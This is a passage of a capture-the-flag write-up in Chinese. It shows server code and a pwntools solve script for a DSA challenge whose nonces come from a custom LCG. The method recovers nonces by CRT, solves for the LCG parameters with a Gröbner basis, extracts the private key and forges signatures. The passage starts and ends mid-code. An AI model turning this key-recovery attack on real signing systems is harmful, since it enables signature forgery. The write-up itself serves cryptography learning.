keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Message </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: \"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> dsa<span class=\"token punctuation\">.</span>q\n                    r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> dsa<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Signature: r = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>r<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, s = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    used_messages<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'3'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 3\\n\"</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged message: \"</span><span class=\"token punctuation\">)</span>\n                final_msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged r: \"</span><span class=\"token punctuation\">)</span>\n                r <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged s: \"</span><span class=\"token punctuation\">)</span>\n                s <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token keyword\">if</span> final_msg <span class=\"token keyword\">in</span> used_messages<span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Message already signed!\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">elif</span> dsa<span class=\"token punctuation\">.</span>verify<span class=\"token punctuation\">(</span>final_msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Good! Your flag: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>flag<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Invalid signature.\\n\"</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list</p>\n<p>9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值</p>\n<p>现在相当于拥有12组k,根据12组k逆向lcg即可</p>\n<p>使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x</p>\n<p>然后伪造签名即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha256\n\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node1.tgctf.woooo.tech\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">31104</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n\nsmall_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">59093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43759</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52859</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61469</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43711</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TripleLCG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">]</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> b\n        self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c\n        self<span class=\"token punctuation\">.</span>d <span class=\"token operator\">=</span> d\n        self<span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>n\n        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> new\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">DSA</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># while True:</span>\n            <span class=\"token comment\"># self.q = getPrime(160)</span>\n            <span class=\"token comment\"># t = 2 * getPrime(1024 - 160) * self.q</span>\n            <span class=\"token comment\"># if isPrime(t + 1):</span>\n            <span class=\"token comment\">#    self.p = t + 1</span>\n            <span class=\"token comment\">#    break</span>\n        self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">=</span> dsa_p\n        self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">=</span> dsa_q\n        self<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>inverse<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> r <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q <span class=\"token keyword\">and</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> s <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        w <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span>\n        u1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        u2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        v <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> u1<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> u2<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> v <span class=\"token operator\">==</span> r\n<span class=\"token comment\"># -------------------------------------------------</span>\n<span class=\"token comment\"># get pqgy</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'!\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'p = '</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p = '</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'q = '</span><span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q = '</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'g = '</span><span class=\"token punctuation\">)</span>\ng<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'g = '</span><span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'y = '</span><span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'y = '</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># part 1</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\nr_l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nks_l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r = '</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'r = '</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ks = '</span><span class=\"token punctuation\">)</span>\n    ks<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ks = '</span><span class=\"token punctuation\">,</span>ks<span class=\"token punctuation\">)</span>\n    r_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n    ks_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ks<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_l<span class=\"token punctuation\">,</span>ks_l<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">recover_k</span><span class=\"token punctuation\">(</span>residues<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    \n    <span class=\"token keyword\">return</span> solve_crt<span class=\"token punctuation\">(</span>residues<span class=\"token punctuation\">,</span>small_primes<span class=\"token punctuation\">)</span>\n\nk_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>recover_k<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> ks_l<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k_<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span>\n\nf1<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\nf2<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nf3<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\nf4<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span>\nf5<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\nf6<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\nf7<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\nf8<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span>\nf9<span class=\"token operator\">=</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>b<span class=\"token operator\">+</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>c<span class=\"token operator\">+</span>d<span class=\"token operator\">-</span>k_<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span>\n\nF<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>f1<span class=\"token punctuation\">,</span>f2<span class=\"token punctuation\">,</span>f3<span class=\"token punctuation\">,</span>f4<span class=\"token punctuation\">,</span>f5<span class=\"token punctuation\">,</span>f6<span class=\"token punctuation\">,</span>f7<span class=\"token punctuation\">,</span>f8<span class=\"token punctuation\">,</span>f9<span class=\"token punctuation\">]</span>\nideal <span class=\"token 